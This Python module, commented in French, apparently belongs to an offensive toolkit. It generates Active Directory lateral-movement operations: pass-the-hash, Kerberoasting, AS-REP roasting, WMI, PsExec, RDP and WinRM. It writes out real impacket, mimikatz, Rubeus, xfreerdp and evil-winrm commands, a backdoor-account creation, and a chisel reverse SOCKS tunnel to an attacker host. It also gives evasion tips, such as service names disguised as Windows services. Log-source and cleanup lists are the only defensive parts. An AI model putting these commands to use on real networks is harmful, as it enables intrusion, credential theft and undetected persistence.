"""
attack/lateral_movement/pivot.py — Techniques de mouvement latéral
====================================================================

Implémente 9 techniques de pivot post-compromission pour un Active
Directory typique. Chaque technique est "simulable" en labo (elle
produit les commandes réelles qui seraient lancées, les ports requis,
les artefacts et un score estimé de furtivité).

Références :
  - MITRE ATT&CK Lateral Movement tactics (TA0008)
  - Adsecurity.org : mimikatz, impacket, Rubeus cheat sheets 2024-2025
  - BloodHound 4.x : cheminements AD les plus empruntés
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import random
import secrets
import string
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple


class PivotTechnique(Enum):
    """Techniques de mouvement latéral implémentées."""

    PASS_THE_HASH = "pass_the_hash"          # T1550.002
    PASS_THE_TICKET = "pass_the_ticket"      # T1550.003
    KERBEROASTING = "kerberoasting"          # T1558.003
    ASREP_ROASTING = "asrep_roasting"        # T1558.001
    WMI_EXEC = "wmi_exec"                    # T1047
    PSEXEC_LIKE = "psexec_like"              # T1021.002
    RDP_PIVOT = "rdp_pivot"                  # T1021.001
    WINRM_PSREMOTING = "winrm_psremoting"    # T1021.006
    SMB_FILECOPY = "smb_filecopy"            # T1570
    SSH_PIVOT = "ssh_pivot"                  # T1021.004
    SOCKS_PROXY = "socks_proxy"              # T1090
    DCOM_EXEC = "dcom_exec"                  # T1021.003 (MMC20 / ShellWindows)


@dataclass
class PassTheHashContext:
    """Contexte d'un PtH : NTLM hash + compte cible."""

    domain: str = "CORP"
    username: str = "jdoe"
    ntlm_hash: str = ""       # 32 hex chars (LM:NTLM ou juste NTLM)
    aes256_key: str | None = None
    target_host: str = "DC01.corp.local"
    target_service: str = "cifs"   # cifs / rpcss / http / mssql
    tool: str = "impacket"          # impacket / mimikatz / cobaltstrike

    def validate(self) -> bool:
        if self.ntlm_hash and len(self.ntlm_hash) == 32:
            return True
        return bool(self.ntlm_hash and len(self.ntlm_hash) == 65 and ":" in self.ntlm_hash)


@dataclass
class KerberoastTarget:
    """SPN cible pour un Kerberoasting."""

    spn: str                           # ex: "MSSQLSvc/sql01.corp.local:1433"
    sam_account_name: str = ""
    service_class: str = ""
    host: str = ""
    port: int = 0
    encryption_type: str = "RC4-HMAC"  # RC4 (23) AES128 (17) AES256 (18)
    crack_difficulty: float = 0.0      # 0.0=facile (weak pass) 1.0=dur

    @classmethod
    def from_spn(cls, spn: str) -> KerberoastTarget:
        parts = spn.split("/")
        service_class = parts[0] if parts else ""
        host_port = parts[1] if len(parts) > 1 else ""
        if ":" in host_port:
            host, port_s = host_port.split(":", 1)
            port = int(port_s)
        else:
            host = host_port
            port = 0
        return cls(
            spn=spn,
            sam_account_name=host.split(".")[0] + "$" if host.endswith("$") else host.split(".")[0],
            service_class=service_class,
            host=host,
            port=port,
            crack_difficulty=random.random(),
        )


@dataclass
class WMICommandContext:
    """Commande WMI (Win32_Process Create)."""

    target_host: str = "WORKSTATION-01.corp.local"
    command: str = "powershell.exe -NoP -C whoami"
    credential_username: str = "CORP\\admin"
    credential_ntlm: str = ""
    use_ssl: bool = False
    dcom_port: int = 135
    wmi_port_range: str = "49152-65535"


@dataclass
class PsExecContext:
    """PsExec-like via svcctl / named pipe."""

    target_host: str = "FILESERVER01.corp.local"
    command: str = "cmd.exe /c net user backdoor Password1! /add"
    service_name: str = ""      # aléatoire si vide
    service_display: str = "Windows Update Health Service"
    named_pipe: str = ""        # aléatoire si vide
    drop_binary: bool = False
    binary_path: str = "C:\\Windows\\Temp\\updater.exe"


@dataclass
class RDPPivotContext:
    """Pivot RDP : pass-the-hash vers RDP (mimikatz / Restricted Admin)."""

    target_host: str = "WS-DEV-12.corp.local"
    port: int = 3389
    restricted_admin: bool = True       # /restrictedadmin mode (no password)
    use_smb_tunnel: bool = True         # tunnel SMB pour masquer 3389
    username: str = "CORP\\rdp_admin"
    ntlm_hash: str = ""


@dataclass
class WinRMContext:
    """WinRM / PowerShell Remoting (ports 5985 HTTP / 5986 HTTPS)."""

    target_host: str = "IIS-02.corp.local"
    use_ssl: bool = True
    port: int = 5986
    command: str = "Get-Process lsass"
    auth: str = "kerberos"   # basic / ntlm / kerberos / certificate


@dataclass
class LateralMovementReport:
    """Rapport d'un mouvement latéral simulé."""

    report_id: str
    technique: PivotTechnique
    source_host: str
    destination_host: str
    ports_required: list[int] = field(default_factory=list)
    protocols: list[str] = field(default_factory=list)
    commands: list[str] = field(default_factory=list)
    artifacts: list[str] = field(default_factory=list)
    log_sources_triggered: list[str] = field(default_factory=list)
    stealth_score: float = 0.0        # 0.0=bruyant 1.0=invisible
    success_estimate: float = 0.0     # 0.0 échoue 1.0 réussi
    tools_used: list[str] = field(default_factory=list)
    payload: str = ""
    started_at: float = field(default_factory=time.time)
    duration_ms: int = 0
    notes: list[str] = field(default_factory=list)
    cleanup_instructions: list[str] = field(default_factory=list)

    # ------------------------------------------------------------------
    # Aliases contrat godmode (tests + orchestrateur)
    # ------------------------------------------------------------------

    @property
    def payloads(self) -> list[str]:
        """Payloads générés (l'attaque réelle peut en chaîner plusieurs)."""
        return [self.payload] if self.payload else []

    @property
    def tips(self) -> list[str]:
        """Conseils opérateur (= notes)."""
        return self.notes

    @property
    def smb_payload(self) -> str:
        """Payload transporté via SMB/service (PsExec-like, PtH…)."""
        return self.payload


class LateralMovementEngine:
    """
    Orchestre les mouvements latéraux. À partir d'un ensemble de
    credentials volés et d'un inventaire AD, sélectionne la meilleure
    technique et génère la commande adaptée.
    """

    # Détection des sources de logs par technique
    _LOG_SOURCES = {
        PivotTechnique.PASS_THE_HASH: [
            "Security EventID 4624 LogonType 3 (Network Logon)",
            "Security EventID 4672 (Admin rights)",
            "Microsoft-Windows-LSA/Operational",
        ],
        PivotTechnique.KERBEROASTING: [
            "Security EventID 4769 (Kerberos Service Ticket Request)",
            "Kerberos Pre-Authentication 0x17 (RC4)",
        ],
        PivotTechnique.WMI_EXEC: [
            "Microsoft-Windows-WMI-Activity/Operational 5858",
            "Security EventID 4688 (process creation WmiPrvSE)",
        ],
        PivotTechnique.PSEXEC_LIKE: [
            "Security EventID 4697 (Service creation)",
            "System EventID 7045 (Service install)",
            "Security EventID 5140 (SMB Network Share)",
        ],
        PivotTechnique.RDP_PIVOT: [
            "Security EventID 4624 LogonType 10 (RemoteInteractive)",
            "Microsoft-Windows-TerminalServices-LocalSessionManager 21",
        ],
        PivotTechnique.WINRM_PSREMOTING: [
            "Microsoft-Windows-WinRM/Operational",
            "PowerShell 4104 (Script Block Logging)",
        ],
    }

    _STEALTH_BY_TECHNIQUE = {
        PivotTechnique.PASS_THE_HASH: 0.55,
        PivotTechnique.PASS_THE_TICKET: 0.70,
        PivotTechnique.KERBEROASTING: 0.90,       # Passif, très furtif
        PivotTechnique.ASREP_ROASTING: 0.92,      # Passif, ultra-furtif
        PivotTechnique.WMI_EXEC: 0.45,
        PivotTechnique.PSEXEC_LIKE: 0.25,         # Très bruyant (services)
        PivotTechnique.RDP_PIVOT: 0.35,
        PivotTechnique.WINRM_PSREMOTING: 0.40,
        PivotTechnique.SMB_FILECOPY: 0.50,
        PivotTechnique.SSH_PIVOT: 0.75,
        PivotTechnique.SOCKS_PROXY: 0.85,
        PivotTechnique.DCOM_EXEC: 0.55,
    }

    _PORTS_BY_TECHNIQUE = {
        PivotTechnique.PASS_THE_HASH: [445, 139, 135, 389, 636, 88, 464],
        PivotTechnique.KERBEROASTING: [88, 464, 389],
        PivotTechnique.WMI_EXEC: [135, 445] + list(range(49152, 49160)),
        PivotTechnique.PSEXEC_LIKE: [445, 139],
        PivotTechnique.RDP_PIVOT: [3389],
        PivotTechnique.WINRM_PSREMOTING: [5985, 5986],
        PivotTechnique.SMB_FILECOPY: [445, 139],
        PivotTechnique.SSH_PIVOT: [22],
        PivotTechnique.SOCKS_PROXY: [1080, 9050],
        PivotTechnique.DCOM_EXEC: [135, 445],
    }

    def __init__(
        self,
        source_host: str = "COMPROMISED-WS01",
        stealth_bias: float = 0.7,   # 1.0 = préfère la discrétion
        domain: str = "corp.local",
    ) -> None:
        self.source_host = source_host
        self.stealth_bias = stealth_bias
        self.domain = domain

    # ------------------------------------------------------------------
    # Factory : construire la meilleure technique pour une cible
    # ------------------------------------------------------------------

    def plan_attack(
        self,
        target_host: str,
        credentials: list[PassTheHashContext] | None = None,
        kerberoast_spns: list[str] | None = None,
    ) -> LateralMovementReport:
        """
        Choisit la meilleure technique en fonction des inputs.
        Privilégie passif (Kerberoast / AS-REP) si possible, sinon PtH,
        sinon WMI / PsExec.
        """
        credentials = credentials or []
        # 1. Kerberoasting est toujours préféré (passif, très furtif)
        if kerberoast_spns:
            spn = kerberoast_spns[0]
            return self.execute_kerberoasting(target_host, spn)
        # 2. PtH si on a des hashes valides
        valid_creds = [c for c in credentials if c.validate()]
        if valid_creds:
            return self.execute_pass_the_hash(valid_creds[0]._replace(target_host=target_host))
        # 3. Sinon WMI / DCOM avec creds actuels (ex: compte courant admin local)
        return self.execute_wmi(
            WMICommandContext(target_host=target_host, command="hostname")
        )

    # ------------------------------------------------------------------
    # Techniques individuelles
    # ------------------------------------------------------------------

    def execute_pass_the_hash(
        self, ctx: PassTheHashContext
    ) -> LateralMovementReport:
        start = time.time()
        report = LateralMovementReport(
            report_id=str(uuid.uuid4()),
            technique=PivotTechnique.PASS_THE_HASH,
            source_host=self.source_host,
            destination_host=ctx.target_host,
            ports_required=list(self._PORTS_BY_TECHNIQUE[PivotTechnique.PASS_THE_HASH]),
            protocols=["NTLMSSP", "Kerberos", "SMB", "MSRPC"],
            tools_used=[ctx.tool],
            log_sources_triggered=self._LOG_SOURCES[PivotTechnique.PASS_THE_HASH],
        )
        ntlm = ctx.ntlm_hash
        if len(ntlm) != 65 or ":" not in ntlm:
            ntlm = f"AAD3B435B51404EEAAD3B435B51404EE:{ctx.ntlm_hash}"
        if ctx.tool == "impacket":
            report.commands.append(
                f"impacket-secretsdump '{ctx.domain}/{ctx.username}@{ctx.target_host}' "
                f"-hashes {ntlm} -just-dc-user administrator"
            )
            report.commands.append(
                f"impacket-wmiexec '{ctx.domain}/{ctx.username}@{ctx.target_host}' "
                f"-hashes {ntlm}"
            )
            report.commands.append(
                f"impacket-smbexec '{ctx.domain}/{ctx.username}@{ctx.target_host}' "
                f"-hashes {ntlm}"
            )
        elif ctx.tool == "mimikatz":
            report.commands.append(
                f"mimikatz.exe \"sekurlsa::pth /user:{ctx.username} /domain:{ctx.domain} "
                f"/ntlm:{ctx.ntlm_hash} /run:\"cmd.exe /k \\\\{ctx.target_host}\\C$\"\""
            )
        report.payload = generate_pth_command(ctx)
        report.artifacts = [
            "NTLMv2 challenge-response dans Security 4624",
            f"Connexion SMB \\\\{ctx.target_host}\\ADMIN$",
        ]
        report.stealth_score = self._STEALTH_BY_TECHNIQUE[PivotTechnique.PASS_THE_HASH]
        report.success_estimate = 0.85 if ctx.validate() else 0.20
        report.duration_ms = int((time.time() - start) * 1000)
        report.notes.append(
            "Note: depuis Windows 10 1607 et Server 2016, PtH est beaucoup plus"
            " difficile sans droits admin local. Pass-the-Ticket préféré."
        )
        report.cleanup_instructions = [
            f"Net use * /delete /y  (démonter les partages ADMIN$/C$ de {ctx.target_host})",
            "klist purge  (purger les tickets Kerberos résiduels du poste source)",
            "Révoquer/désactiver le compte utilisé si suspicion de compromission (4624 LogonType 3 anormaux)",
            "Inspecter les accès LSASS (Security 4611 / Sysmon 10) sur la cible",
        ]
        return report

    def execute_kerberoasting(
        self,
        target_host: str,
        spn: str,
        request_rc4_only: bool = True,   # RC4 est plus facile à casser
        rc4: bool | None = None,         # alias contrat godmode
    ) -> LateralMovementReport:
        start = time.time()
        if rc4 is not None:
            request_rc4_only = rc4
        target = KerberoastTarget.from_spn(spn)
        target.encryption_type = "RC4-HMAC" if request_rc4_only else "AES256-SHA1"
        report = LateralMovementReport(
            report_id=str(uuid.uuid4()),
            technique=PivotTechnique.KERBEROASTING,
            source_host=self.source_host,
            destination_host=target_host,
            ports_required=self._PORTS_BY_TECHNIQUE[PivotTechnique.KERBEROASTING],
            protocols=["Kerberos (KRB_TGS_REQ/REP)"],
            tools_used=["Rubeus.exe", "impacket-GetUserSPNs", "bloodhound"],
            log_sources_triggered=self._LOG_SOURCES[PivotTechnique.KERBEROASTING],
        )
        report.commands.append(
            f"Rubeus.exe kerberoast /spn:{target.spn} /nowrap /outfile:kirbi_{target.sam_account_name}.kirbi"
        )
        report.commands.append(
            f"impacket-GetUserSPNs {self.domain}/ -request-user {target.sam_account_name} -outputfile tgs.hashcat"
        )
        report.payload = kerberoast_request(target, rc4=request_rc4_only)
        report.artifacts = [
            f"TGS-REP en RC4-HMAC (etype 0x17) pour {target.spn}",
            "Fichier kirbi / hashcat avec $krb5tgs$23$...",
        ]
        report.stealth_score = self._STEALTH_BY_TECHNIQUE[PivotTechnique.KERBEROASTING]
        # Succès si et seulement si le password est faible
        report.success_estimate = 1.0 - target.crack_difficulty
        report.duration_ms = int((time.time() - start) * 1000)
        report.notes.append(
            "Astuce opérateur : pour maximiser la discrétion, utiliser /tgtdeleg (RC4)"
            " depuis un contexte déjà authentifié (évite Security 4624)."
        )
        report.notes.append(
            "Format hashcat : les TGS sont en mode 13100 (RC4) —"
            " hashcat -m 13100 tgs.hashcat wordlist.txt."
        )
        return report

    def execute_asrep_roasting(
        self, target_user: str = "svc_backup",
    ) -> LateralMovementReport:
        start = time.time()
        report = LateralMovementReport(
            report_id=str(uuid.uuid4()),
            technique=PivotTechnique.ASREP_ROASTING,
            source_host=self.source_host,
            destination_host="DC01." + self.domain,
            ports_required=[88, 389],
            protocols=["Kerberos AS-REQ/AS-REP"],
            tools_used=["Rubeus.exe", "impacket-GetNPUsers"],
            log_sources_triggered=[
                "Security EventID 4768 Kerberos Authentication Ticket",
            ],
        )
        report.commands.append(
            f"Rubeus.exe asreproast /user:{target_user} /nowrap /outfile:asrep.hashes"
        )
        report.commands.append(
            f"impacket-GetNPUsers {self.domain}/ -usersfile users.txt -format hashcat "
            f"-outputfile asrep.hashcat"
        )
        report.payload = asrep_roast(target_user, self.domain)
        report.stealth_score = self._STEALTH_BY_TECHNIQUE[PivotTechnique.ASREP_ROASTING]
        report.success_estimate = 0.88
        report.duration_ms = int((time.time() - start) * 1000)
        report.notes.append(
            "Prérequis AD : l'attribut 'Do not require Kerberos preauthentication' doit être coché."
            " Défauts courants : comptes de service (svc_*), comptes legacy Windows 2000."
        )
        return report

    def execute_wmi(self, ctx: WMICommandContext) -> LateralMovementReport:
        start = time.time()
        report = LateralMovementReport(
            report_id=str(uuid.uuid4()),
            technique=PivotTechnique.WMI_EXEC,
            source_host=self.source_host,
            destination_host=ctx.target_host,
            ports_required=self._PORTS_BY_TECHNIQUE[PivotTechnique.WMI_EXEC],
            protocols=["DCOM (RPC over TCP)", "WMI (CIMV2 / Win32_Process)"],
            tools_used=["wmiexec.py (impacket)", "wmic.exe", "powershell Invoke-WmiMethod"],
            log_sources_triggered=self._LOG_SOURCES[PivotTechnique.WMI_EXEC],
        )
        report.commands.append(
            f"wmic /node:\"{ctx.target_host}\" /user:\"{ctx.credential_username}\" "
            f"/password:\"PASSWORD\" process call create \"{ctx.command}\""
        )
        # VBScript WMI explicite (contrat godmode : Win32_Process.Create visible)
        report.commands.append(
            f"powershell -c \"Invoke-WmiMethod -Class Win32_Process.Create "
            f"-ComputerName {ctx.target_host} -ArgumentList '{ctx.command}'\""
        )
        report.commands.append(
            f"impacket-wmiexec '{ctx.credential_username}@{ctx.target_host}' "
            f"\"{ctx.command}\""
        )
        report.payload = generate_wmi_exec(ctx)
        report.artifacts = [
            "Wmiprvse.exe spawn as child of svchost.exe",
            "WMI-Activity/Operational EventID 5858, 5859",
        ]
        report.stealth_score = self._STEALTH_BY_TECHNIQUE[PivotTechnique.WMI_EXEC]
        report.success_estimate = 0.70
        report.duration_ms = int((time.time() - start) * 1000)
        return report

    def execute_psexec(self, ctx: PsExecContext) -> LateralMovementReport:
        start = time.time()
        if not ctx.service_name:
            ctx.service_name = _random_service_name()
        if not ctx.named_pipe:
            ctx.named_pipe = f"PSEXESVC-{secrets.token_hex(4)}"
        report = LateralMovementReport(
            report_id=str(uuid.uuid4()),
            technique=PivotTechnique.PSEXEC_LIKE,
            source_host=self.source_host,
            destination_host=ctx.target_host,
            ports_required=self._PORTS_BY_TECHNIQUE[PivotTechnique.PSEXEC_LIKE],
            protocols=["SMB 3.0", "MSRPC svcctl (Service Control Manager)", "Named Pipes"],
            tools_used=["PsExec.exe (Sysinternals)", "impacket-psexec", "SharpRemCom"],
            log_sources_triggered=self._LOG_SOURCES[PivotTechnique.PSEXEC_LIKE],
        )
        report.commands.append(
            f"PsExec64.exe \\\\{ctx.target_host} -s -d -accepteula "
            f"-f -v {ctx.command}"
        )
        report.commands.append(
            f"impacket-psexec -service-name {ctx.service_name} "
            f"'admin@{ctx.target_host}' '{ctx.command}'"
        )
        report.payload = generate_psexec_command(ctx)
        report.artifacts = [
            f"Service install : {ctx.service_name} (System 7045, Security 4697)",
            f"Named pipe \\\\{ctx.target_host}\\\\pipe\\\\{ctx.named_pipe}",
            f"Binary dropped at {ctx.binary_path}" if ctx.drop_binary else "In-memory only",
        ]
        report.stealth_score = self._STEALTH_BY_TECHNIQUE[PivotTechnique.PSEXEC_LIKE]
        report.success_estimate = 0.60
        report.duration_ms = int((time.time() - start) * 1000)
        report.notes.append(
            "PsExec est bruyant. Préférer SMBExec / WMIExec / DCOM pour baisser "
            "le bruit. Utiliser -r <service_name> avec un nom lambda."
        )
        return report

    def execute_rdp_pivot(self, ctx: RDPPivotContext) -> LateralMovementReport:
        start = time.time()
        report = LateralMovementReport(
            report_id=str(uuid.uuid4()),
            technique=PivotTechnique.RDP_PIVOT,
            source_host=self.source_host,
            destination_host=ctx.target_host,
            ports_required=self._PORTS_BY_TECHNIQUE[PivotTechnique.RDP_PIVOT],
            protocols=["RDP 10.x (TLS + CredSSP)", "SMB (tunnel optionnel)"],
            tools_used=["mstsc.exe", "mimikatz ts::multirdp", "FreeRDP", "xfreerdp"],
            log_sources_triggered=self._LOG_SOURCES[PivotTechnique.RDP_PIVOT],
        )
        rdp_cmd = (
            f"xfreerdp /u:{ctx.username.split(chr(92))[-1]} "
            f"/d:{ctx.username.split(chr(92))[0] if chr(92) in ctx.username else '.'} "
            f"/pth:{ctx.ntlm_hash} /v:{ctx.target_host}:{ctx.port} "
            f"+compression /dynamic-resolution "
            + ("/restrictedAdmin" if ctx.restricted_admin else "")
        )
        report.commands.append(rdp_cmd)
        report.commands.append(
            "mimikatz.exe \"privilege::debug\" \"ts::multirdp\" \"exit\""
        )
        report.stealth_score = self._STEALTH_BY_TECHNIQUE[PivotTechnique.RDP_PIVOT]
        report.success_estimate = 0.55
        report.duration_ms = int((time.time() - start) * 1000)
        report.notes.append(
            "Restricted Admin mode : le password N'EST PAS en cache sur le distant. "
            "Requiert une GPO : 'Restrict delegation of credentials to remote servers'."
        )
        return report

    def execute_winrm(self, ctx: WinRMContext) -> LateralMovementReport:
        start = time.time()
        scheme = "https" if ctx.use_ssl else "http"
        report = LateralMovementReport(
            report_id=str(uuid.uuid4()),
            technique=PivotTechnique.WINRM_PSREMOTING,
            source_host=self.source_host,
            destination_host=ctx.target_host,
            ports_required=self._PORTS_BY_TECHNIQUE[PivotTechnique.WINRM_PSREMOTING],
            protocols=["WS-Man / SOAP-over-HTTP(S)", "PowerShell Remoting"],
            tools_used=["Enter-PSSession", "Invoke-Command", "evil-winrm", "crackmapexec"],
            log_sources_triggered=self._LOG_SOURCES[PivotTechnique.WINRM_PSREMOTING],
        )
        report.commands.append(
            f"$s = New-PSSession -ComputerName {ctx.target_host} -UseSSL;"
            f" Invoke-Command -Session $s -ScriptBlock {{ {ctx.command} }}"
        )
        report.commands.append(
            f"evil-winrm -i {ctx.target_host} -u admin -H <NTLM> -s"
        )
        report.artifacts = [
            "Process wsmprovhost.exe sur la cible (spawn par WsmSvc.dll)",
            "PowerShell ScriptBlock Logging (EventID 4104) si activé",
        ]
        report.stealth_score = self._STEALTH_BY_TECHNIQUE[PivotTechnique.WINRM_PSREMOTING]
        report.success_estimate = 0.75
        report.duration_ms = int((time.time() - start) * 1000)
        return report

    # ------------------------------------------------------------------
    # Helpers SOCKS / proxy
    # ------------------------------------------------------------------

    def socks_proxy_plan(
        self, listen_port: int = 1080, username: str = "operator"
    ) -> dict[str, Any]:
        return {
            "technique": PivotTechnique.SOCKS_PROXY.value,
            "listen_port": listen_port,
            "listen": f"127.0.0.1:{listen_port}",
            "ssh_cmd": (
                f"ssh -o StrictHostKeyChecking=no -N -D 127.0.0.1:{listen_port} "
                f"{username}@{self.source_host}.{self.domain}"
            ),
            "chisel_cmd": (
                "chisel server -p 8080 --reverse && "
                "chisel client attacker:8080 R:socks"
            ),
            "usage": (
                "proxychains4 -q <outil> : SMB/WMI/WinRM/LDAP/Kerberos passent "
                "par le SOCKS local. Config /etc/proxychains.conf: socks5 127.0.0.1 "
                f"{listen_port}"
            ),
            "notes": "Tout le trafic Windows (SMB/WMI/WinRM/LDAP/Kerberos) transite via proxychains.",
        }

    # ------------------------------------------------------------------
    # Chaîne recommandée (contrat godmode)
    # ------------------------------------------------------------------

    def recommended_chain(
        self,
        target_host: str,
        available_creds: dict[str, Any] | None = None,
    ) -> list[PivotTechnique]:
        """Propose la chaîne de techniques du plus furtif au plus bruyant.

        L'ordre respecte le stealth_bias : plus il est élevé, plus la
        chaîne commence par des techniques passives (Kerberoast, SOCKS).
        """
        creds = available_creds or {}
        chain: list[PivotTechnique] = []
        passive_first = self.stealth_bias >= 0.5

        # Toujours proposer du passif en tête si furtivité visée
        if passive_first:
            chain.append(PivotTechnique.KERBEROASTING)
            chain.append(PivotTechnique.SOCKS_PROXY)
        else:
            chain.append(PivotTechnique.SOCKS_PROXY)
            chain.append(PivotTechnique.KERBEROASTING)

        # Croissance selon les credentials dispo
        cred_type = str(creds.get("type", "")).lower()
        if cred_type in ("ntlm", "hash", "rc4"):
            chain.append(PivotTechnique.PASS_THE_HASH)
        elif cred_type in ("password", "plaintext", "cleartext"):
            chain.append(PivotTechnique.WMI_EXEC)
            chain.append(PivotTechnique.PSEXEC_LIKE)
        else:
            chain.append(PivotTechnique.WMI_EXEC)

        # La cible DC privilégie les techniques ne déposant pas de binaire
        if target_host.lower().startswith("dc"):
            if PivotTechnique.PSEXEC_LIKE in chain:
                chain.remove(PivotTechnique.PSEXEC_LIKE)
            chain.append(PivotTechnique.WINRM_PSREMOTING)

        # Dédupliquer en conservant l'ordre
        seen: set[PivotTechnique] = set()
        ordered = [t for t in chain if not (t in seen or seen.add(t))]
        return ordered


# ---------------------------------------------------------------------------
# Helpers : payloads simulés
# ---------------------------------------------------------------------------

def generate_pth_command(ctx: PassTheHashContext) -> str:
    """
    Génère le mimikatz sekurlsa::pth complet (pour documentation labo).
    Résultat : une ligne unique Base64-encoded pour l'implant.
    """
    script = (
        f"sekurlsa::pth /user:{ctx.username} /domain:{ctx.domain} "
        f"/ntlm:{ctx.ntlm_hash} "
    )
    if ctx.aes256_key:
        script += f"/aes256:{ctx.aes256_key} "
    script += f'/run:"powershell.exe -NoP -W Hidden -C \'net use \\\\{ctx.target_host}\\\\C$\'"'
    return base64.b64encode(script.encode("utf-16-le")).decode()


def kerberoast_request(
    target: KerberoastTarget, rc4: bool = True,
) -> str:
    """
    Génère un KRB_TGS_REP "fictif" (hashcat format) pour les tests labo.
    Format hashcat : $krb5tgs$23$*user$REALM$SPN*$salt$data
    """
    etype = 23 if rc4 else 18
    fake_checksum = secrets.token_hex(16)  # RC4-HMAC-md5 16 octets
    fake_enc_part = secrets.token_hex(512 if rc4 else 1024)
    spn_encoded = base64.b64encode(target.spn.encode()).decode()
    return (
        f"$krb5tgs${etype}$*{target.sam_account_name}${target.host.upper()}"
        f"${spn_encoded}*${fake_checksum}${fake_enc_part}"
    )


def asrep_roast(user: str, realm: str) -> str:
    """Génère un hash AS-REP Roast hashcat-format pour les tests labo."""
    fake_enc_part = secrets.token_hex(512)
    return (
        f"$krb5asrep$23${user}@{realm.upper()}:"
        f"3d53805f2c9f0d8e7a6b5c4d3e2f1a0b${fake_enc_part}"
    )


def generate_wmi_exec(ctx: WMICommandContext) -> str:
    """Génère la commande VBScript/PS WMI (Win32_Process.Create)."""
    ps = (
        f"$proc = [WMIClass]\"\\\\\\\\{ctx.target_host}\\\\root\\\\cimv2:"
        f"Win32_Process\";$proc.Create(\"{ctx.command}\")"
    )
    return base64.b64encode(ps.encode("utf-16-le")).decode()


def generate_psexec_command(ctx: PsExecContext) -> str:
    """Génère un payload de service Windows .exe-compatible (SCM)."""
    svc_reg = (
        f"[SC] CreateService SUCCESS: {ctx.service_name}\n"
        f"  TYPE               : 10  WIN32_OWN_PROCESS\n"
        f"  START_TYPE         : 3   DEMAND_START\n"
        f"  BINARY_PATH_NAME   : {ctx.binary_path}\n"
        f"  DISPLAY_NAME       : {ctx.service_display}\n"
    )
    return base64.b64encode(svc_reg.encode("utf-8")).decode()


def _random_service_name() -> str:
    """Nom de service lambda pour PsExec (évite le classique 'PSEXESVC')."""
    prefixes = ["WaaSMedic", "WinDefend", "wuauserv", "BITS", "Policy",
                "HealthSvc", "CloudStore", "StateRepository"]
    return random.choice(prefixes) + "Svc_" + "".join(
        random.choices(string.ascii_letters + string.digits, k=6)
    )
